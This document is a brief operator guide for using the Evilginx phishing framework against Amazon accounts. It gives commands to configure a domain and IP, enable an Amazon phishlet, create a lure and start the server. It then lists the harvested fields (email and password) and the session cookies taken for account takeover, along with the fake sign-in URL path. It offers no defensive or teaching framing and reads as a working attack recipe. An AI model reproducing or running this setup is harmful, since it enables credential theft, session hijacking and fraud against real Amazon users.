# Evilginx Guide for Amazon

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable amazon
landers create amazon
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Email | `email` |
| Password | `password` |

## Tokens Captured

- `session-id` - Session ID
- `ubid-main` - UBID token
- `at-main` - AT token

## Login URL

```
https://your-domain.com/amazon/ap/signin
```

---

**VANTABLACK**
